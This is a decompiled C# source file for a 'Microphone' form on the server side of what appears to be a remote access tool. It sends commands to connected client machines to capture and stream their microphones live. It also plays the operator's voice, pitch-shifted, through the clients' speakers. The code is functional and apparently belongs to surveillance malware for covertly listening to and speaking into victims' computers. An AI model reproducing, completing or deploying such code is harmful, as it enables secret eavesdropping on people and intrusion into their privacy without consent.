using System;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Windows.Forms;
using CustomControls.RJControls;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using NAudio.Wave;
using NAudio.Wave.SampleProviders;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormMicrophone : FormMaterial
{
	public Clients parrent;

	public Clients client1;

	public Clients client2;

	public static int sampleRate = 48000;

	public float Pitch = 1f;

	public BufferedWaveProvider bufferedWaveProvider;

	public VolumeSampleProvider volumeSampleProvider;

	public G722ChatCodec g722;

	public WaveOut waveOut;

	private WaveIn waveIn;

	private IContainer components;

	public Timer timer1;

	public RJComboBox rjComboBox1;

	public MaterialSwitch materialSwitch1;

	public RJComboBox rjComboBox2;

	public MaterialSwitch materialSwitch2;

	public GroupBox groupBox1;

	public GroupBox groupBox2;

	private Panel panel1;

	private MaterialSlider materialSlider1;

	private MaterialSlider materialSlider2;

	public FormMicrophone()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormMicrophone_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		try
		{
			MaterialSlider slider = materialSlider1;
			PropertyInfo valueProperty = slider.GetType().GetProperty("Value");
			PropertyInfo minProperty = slider.GetType().GetProperty("RangeMin");
			PropertyInfo maxProperty = slider.GetType().GetProperty("RangeMax");
			if (minProperty != null)
			{
				minProperty.SetValue(slider, 0);
			}
			if (maxProperty != null)
			{
				maxProperty.SetValue(slider, 100);
			}
			if (valueProperty != null)
			{
				valueProperty.SetValue(slider, 50);
			}
		}
		catch
		{
		}
		try
		{
			MaterialSlider slider2 = materialSlider2;
			PropertyInfo valueProperty2 = slider2.GetType().GetProperty("Value");
			PropertyInfo minProperty2 = slider2.GetType().GetProperty("RangeMin");
			PropertyInfo maxProperty2 = slider2.GetType().GetProperty("RangeMax");
			if (minProperty2 != null)
			{
				minProperty2.SetValue(slider2, 1);
			}
			if (maxProperty2 != null)
			{
				maxProperty2.SetValue(slider2, 21);
			}
			if (valueProperty2 != null)
			{
				valueProperty2.SetValue(slider2, 11);
			}
		}
		catch
		{
		}
		timer1.Start();
	}

	private void ChangeScheme(object sender)
	{
		Color primary = FormMaterial.PrimaryColor;
		bool num = MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK;
		Color back = (num ? Color.FromArgb(40, 40, 40) : Color.White);
		Color editBack = (num ? Color.FromArgb(40, 40, 40) : Color.White);
		Color text = (num ? Color.WhiteSmoke : Color.Black);
		BackColor = back;
		panel1.BackColor = back;
		groupBox1.BackColor = back;
		groupBox2.BackColor = back;
		if (materialSlider1 != null)
		{
			materialSlider1.BackColor = back;
			materialSlider1.Invalidate();
		}
		if (materialSlider2 != null)
		{
			materialSlider2.BackColor = back;
			materialSlider2.Invalidate();
		}
		rjComboBox1.BorderColor = primary;
		rjComboBox1.IconColor = primary;
		rjComboBox1.BackColor = editBack;
		rjComboBox1.ForeColor = text;
		rjComboBox1.ListBackColor = editBack;
		rjComboBox1.ListTextColor = text;
		rjComboBox2.BorderColor = primary;
		rjComboBox2.IconColor = primary;
		rjComboBox2.BackColor = editBack;
		rjComboBox2.ForeColor = text;
		rjComboBox2.ListBackColor = editBack;
		rjComboBox2.ListTextColor = text;
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (client1 != null)
		{
			client1.Disconnect();
		}
		if (client2 != null)
		{
			client2.Disconnect();
		}
		if (g722 != null)
		{
			g722.Dispose();
		}
		if (waveIn != null)
		{
			waveIn.StopRecording();
			waveIn.Dispose();
		}
		if (waveOut != null)
		{
			waveOut.Stop();
			waveOut.Dispose();
		}
		if (bufferedWaveProvider != null)
		{
			bufferedWaveProvider = null;
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (!parrent.itsConnect)
		{
			Close();
		}
		if (client1 != null && !client1.itsConnect)
		{
			Close();
		}
		if (client2 != null && !client2.itsConnect)
		{
			Close();
		}
	}

	private void trackBar2_Scroll(object sender, EventArgs e)
	{
		float num = ((materialSlider2.Value > 11) ? ((float)(materialSlider2.Value - 1) / 10f) : ((materialSlider2.Value >= 11) ? 1f : ((float)(materialSlider2.Value - 1) / 10f * 0.5f + 0.5f)));
		if (Pitch != num)
		{
			Pitch = num;
			client2.Send(LEB128.Write(new object[2] { "Tone", num }));
		}
	}

	private void materialSwitch1_CheckedChanged(object sender, EventArgs e)
	{
		if (!materialSwitch1.Checked)
		{
			if (waveOut != null)
			{
				waveOut.Stop();
				waveOut.Dispose();
			}
			if (g722 != null)
			{
				g722.Dispose();
			}
			if (bufferedWaveProvider != null)
			{
				bufferedWaveProvider = null;
			}
			client1.Send(LEB128.Write(new object[2] { "RecoveryStopNAudio", Pitch }));
			return;
		}
		if (rjComboBox1.SelectedIndex == -1)
		{
			materialSwitch1.Checked = false;
			return;
		}
		g722 = new G722ChatCodec();
		bufferedWaveProvider = new BufferedWaveProvider(g722.RecordFormat);
		bufferedWaveProvider.DiscardOnBufferOverflow = true;
		client1.Send(LEB128.Write(new object[2]
		{
			"RecoveryNAudio",
			(byte)rjComboBox1.SelectedIndex
		}));
		volumeSampleProvider = new VolumeSampleProvider(bufferedWaveProvider.ToSampleProvider());
		try
		{
			PropertyInfo valueProperty = materialSlider1.GetType().GetProperty("Value");
			if (valueProperty != null)
			{
				int value = (int)valueProperty.GetValue(materialSlider1);
				volumeSampleProvider.Volume = (float)value / 100f;
			}
			else
			{
				volumeSampleProvider.Volume = 0.5f;
			}
		}
		catch
		{
			volumeSampleProvider.Volume = 0.5f;
		}
		waveOut = new WaveOut();
		waveOut.Volume = 1f;
		waveOut.Init(volumeSampleProvider);
		waveOut.Play();
	}

	private void materialSwitch2_CheckedChanged(object sender, EventArgs e)
	{
		if (materialSwitch2.Checked)
		{
			client2.Send(LEB128.Write(new object[2] { "PlayerStart", Pitch }));
			g722 = new G722ChatCodec();
			waveIn = new WaveIn();
			waveIn.DeviceNumber = rjComboBox2.SelectedIndex;
			waveIn.DataAvailable += waveIn_DataAvailable;
			waveIn.WaveFormat = g722.RecordFormat;
			waveIn.StartRecording();
		}
		else
		{
			client2.Send(LEB128.Write(new object[1] { "PlayerStop" }));
			if (waveIn != null)
			{
				waveIn.StopRecording();
				waveIn.Dispose();
			}
			if (g722 != null)
			{
				g722.Dispose();
			}
		}
	}

	public void waveIn_DataAvailable(object sender, WaveInEventArgs e)
	{
		client2.Send(LEB128.Write(new object[2]
		{
			"PlayerBuffer",
			g722.Encode(e.Buffer, 0, e.Buffer.Length)
		}));
	}

	public void Buffer(byte[] e)
	{
		if (waveOut != null && bufferedWaveProvider != null && g722 != null)
		{
			byte[] array = g722.Decode(e, 0, e.Length);
			bufferedWaveProvider.AddSamples(array, 0, array.Count());
		}
	}

	private void materialSlider1_MouseUp(object sender, MouseEventArgs e)
	{
		if (!materialSwitch1.Checked || volumeSampleProvider == null)
		{
			return;
		}
		float volume = 0.5f;
		try
		{
			MaterialSlider slider = materialSlider1;
			PropertyInfo valueProperty = slider.GetType().GetProperty("Value");
			if (valueProperty != null)
			{
				volume = (float)(int)valueProperty.GetValue(slider) / 100f;
			}
			else
			{
				float percentage = (float)e.X / (float)slider.Width;
				if (percentage < 0f)
				{
					percentage = 0f;
				}
				if (percentage > 1f)
				{
					percentage = 1f;
				}
				volume = percentage;
			}
		}
		catch
		{
			if (sender is Control slider2)
			{
				float percentage2 = (float)e.X / (float)slider2.Width;
				if (percentage2 < 0f)
				{
					percentage2 = 0f;
				}
				if (percentage2 > 1f)
				{
					percentage2 = 1f;
				}
				volume = percentage2;
			}
		}
		volumeSampleProvider.Volume = volume;
	}

	private void materialSlider1_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.Button != MouseButtons.Left || !materialSwitch1.Checked || volumeSampleProvider == null)
		{
			return;
		}
		float volume = 0.5f;
		try
		{
			MaterialSlider slider = materialSlider1;
			PropertyInfo valueProperty = slider.GetType().GetProperty("Value");
			if (valueProperty != null)
			{
				volume = (float)(int)valueProperty.GetValue(slider) / 100f;
			}
			else
			{
				float percentage = (float)e.X / (float)slider.Width;
				if (percentage < 0f)
				{
					percentage = 0f;
				}
				if (percentage > 1f)
				{
					percentage = 1f;
				}
				volume = percentage;
			}
		}
		catch
		{
			if (sender is Control slider2)
			{
				float percentage2 = (float)e.X / (float)slider2.Width;
				if (percentage2 < 0f)
				{
					percentage2 = 0f;
				}
				if (percentage2 > 1f)
				{
					percentage2 = 1f;
				}
				volume = percentage2;
			}
		}
		volumeSampleProvider.Volume = volume;
	}

	private void materialSlider1_Click(object sender, EventArgs e)
	{
		if (materialSwitch1.Checked && volumeSampleProvider != null)
		{
			volumeSampleProvider.Volume = 0.75f;
		}
	}

	private void materialSlider2_MouseUp(object sender, MouseEventArgs e)
	{
		UpdateToneFromSlider2();
	}

	private void materialSlider2_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			UpdateToneFromSlider2();
		}
	}

	private void materialSlider2_Click(object sender, EventArgs e)
	{
		UpdateToneFromSlider2();
	}

	private void UpdateToneFromSlider2()
	{
		try
		{
			int sliderValue = GetSlider2Value();
			float num = ((sliderValue > 11) ? ((float)(sliderValue - 1) / 10f) : ((sliderValue >= 11) ? 1f : ((float)(sliderValue - 1) / 10f * 0.5f + 0.5f)));
			if (Pitch != num)
			{
				Pitch = num;
				if (client2 != null && client2.itsConnect)
				{
					client2.Send(LEB128.Write(new object[2] { "Tone", num }));
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private int GetSlider2Value()
	{
		if (materialSlider2 == null)
		{
			return 11;
		}
		try
		{
			return materialSlider2.Value;
		}
		catch
		{
			try
			{
				PropertyInfo valueProperty = materialSlider2.GetType().GetProperty("Value");
				if (valueProperty != null)
				{
					return (int)valueProperty.GetValue(materialSlider2);
				}
			}
			catch
			{
			}
			return 11;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.groupBox1 = new System.Windows.Forms.GroupBox();
		this.materialSlider1 = new MaterialSkin.Controls.MaterialSlider();
		this.rjComboBox1 = new CustomControls.RJControls.RJComboBox();
		this.materialSwitch1 = new MaterialSkin.Controls.MaterialSwitch();
		this.groupBox2 = new System.Windows.Forms.GroupBox();
		this.materialSlider2 = new MaterialSkin.Controls.MaterialSlider();
		this.rjComboBox2 = new CustomControls.RJControls.RJComboBox();
		this.materialSwitch2 = new MaterialSkin.Controls.MaterialSwitch();
		this.panel1 = new System.Windows.Forms.Panel();
		this.groupBox1.SuspendLayout();
		this.groupBox2.SuspendLayout();
		base.SuspendLayout();
		this.timer1.Enabled = true;
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.groupBox1.Controls.Add(this.materialSlider1);
		this.groupBox1.Controls.Add(this.rjComboBox1);
		this.groupBox1.Controls.Add(this.materialSwitch1);
		this.groupBox1.Enabled = false;
		this.groupBox1.Location = new System.Drawing.Point(26, 88);
		this.groupBox1.Name = "groupBox1";
		this.groupBox1.Size = new System.Drawing.Size(300, 149);
		this.groupBox1.TabIndex = 29;
		this.groupBox1.TabStop = false;
		this.groupBox1.Text = "Client";
		this.materialSlider1.Depth = 0;
		this.materialSlider1.ForeColor = System.Drawing.Color.FromArgb(222, 0, 0, 0);
		this.materialSlider1.Location = new System.Drawing.Point(6, 55);
		this.materialSlider1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSlider1.Name = "materialSlider1";
		this.materialSlider1.Size = new System.Drawing.Size(269, 40);
		this.materialSlider1.TabIndex = 28;
		this.materialSlider1.Text = "";
		this.materialSlider1.Click += new System.EventHandler(materialSlider1_Click);
		this.materialSlider1.MouseMove += new System.Windows.Forms.MouseEventHandler(materialSlider1_MouseMove);
		this.materialSlider1.MouseUp += new System.Windows.Forms.MouseEventHandler(materialSlider1_MouseUp);
		this.rjComboBox1.BackColor = System.Drawing.Color.White;
		this.rjComboBox1.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox1.BorderSize = 1;
		this.rjComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.rjComboBox1.ForeColor = System.Drawing.Color.DimGray;
		this.rjComboBox1.IconColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox1.ListBackColor = System.Drawing.Color.White;
		this.rjComboBox1.ListTextColor = System.Drawing.Color.DimGray;
		this.rjComboBox1.Location = new System.Drawing.Point(25, 19);
		this.rjComboBox1.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBox1.Name = "rjComboBox1";
		this.rjComboBox1.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBox1.Size = new System.Drawing.Size(250, 30);
		this.rjComboBox1.TabIndex = 27;
		this.rjComboBox1.Texts = "";
		this.materialSwitch1.AutoSize = true;
		this.materialSwitch1.Depth = 0;
		this.materialSwitch1.Location = new System.Drawing.Point(6, 103);
		this.materialSwitch1.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch1.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch1.Name = "materialSwitch1";
		this.materialSwitch1.Ripple = true;
		this.materialSwitch1.Size = new System.Drawing.Size(92, 37);
		this.materialSwitch1.TabIndex = 26;
		this.materialSwitch1.Text = "Start";
		this.materialSwitch1.UseVisualStyleBackColor = true;
		this.materialSwitch1.CheckedChanged += new System.EventHandler(materialSwitch1_CheckedChanged);
		this.groupBox2.Controls.Add(this.materialSlider2);
		this.groupBox2.Controls.Add(this.rjComboBox2);
		this.groupBox2.Controls.Add(this.materialSwitch2);
		this.groupBox2.Enabled = false;
		this.groupBox2.Location = new System.Drawing.Point(348, 88);
		this.groupBox2.Name = "groupBox2";
		this.groupBox2.Size = new System.Drawing.Size(300, 149);
		this.groupBox2.TabIndex = 30;
		this.groupBox2.TabStop = false;
		this.groupBox2.Text = "You";
		this.materialSlider2.Depth = 0;
		this.materialSlider2.ForeColor = System.Drawing.Color.FromArgb(222, 0, 0, 0);
		this.materialSlider2.Location = new System.Drawing.Point(25, 55);
		this.materialSlider2.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSlider2.Name = "materialSlider2";
		this.materialSlider2.Size = new System.Drawing.Size(250, 40);
		this.materialSlider2.TabIndex = 28;
		this.materialSlider2.Text = "Tone Speak";
		this.materialSlider2.Click += new System.EventHandler(materialSlider2_Click);
		this.materialSlider2.MouseMove += new System.Windows.Forms.MouseEventHandler(materialSlider2_MouseMove);
		this.materialSlider2.MouseUp += new System.Windows.Forms.MouseEventHandler(materialSlider2_MouseUp);
		this.rjComboBox2.BackColor = System.Drawing.Color.White;
		this.rjComboBox2.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox2.BorderSize = 1;
		this.rjComboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.rjComboBox2.ForeColor = System.Drawing.Color.DimGray;
		this.rjComboBox2.IconColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox2.ListBackColor = System.Drawing.Color.White;
		this.rjComboBox2.ListTextColor = System.Drawing.Color.DimGray;
		this.rjComboBox2.Location = new System.Drawing.Point(25, 19);
		this.rjComboBox2.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBox2.Name = "rjComboBox2";
		this.rjComboBox2.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBox2.Size = new System.Drawing.Size(250, 30);
		this.rjComboBox2.TabIndex = 27;
		this.rjComboBox2.Texts = "";
		this.materialSwitch2.AutoSize = true;
		this.materialSwitch2.Depth = 0;
		this.materialSwitch2.Location = new System.Drawing.Point(6, 103);
		this.materialSwitch2.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch2.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch2.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch2.Name = "materialSwitch2";
		this.materialSwitch2.Ripple = true;
		this.materialSwitch2.Size = new System.Drawing.Size(92, 37);
		this.materialSwitch2.TabIndex = 26;
		this.materialSwitch2.Text = "Start";
		this.materialSwitch2.UseVisualStyleBackColor = true;
		this.materialSwitch2.CheckedChanged += new System.EventHandler(materialSwitch2_CheckedChanged);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(667, 198);
		this.panel1.TabIndex = 31;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(673, 265);
		base.Controls.Add(this.groupBox2);
		base.Controls.Add(this.groupBox1);
		base.Controls.Add(this.panel1);
		base.Name = "FormMicrophone";
		this.Text = "Microphone";
		base.Load += new System.EventHandler(FormMicrophone_Load);
		this.groupBox1.ResumeLayout(false);
		this.groupBox1.PerformLayout();
		this.groupBox2.ResumeLayout(false);
		this.groupBox2.PerformLayout();
		base.ResumeLayout(false);
	}
}
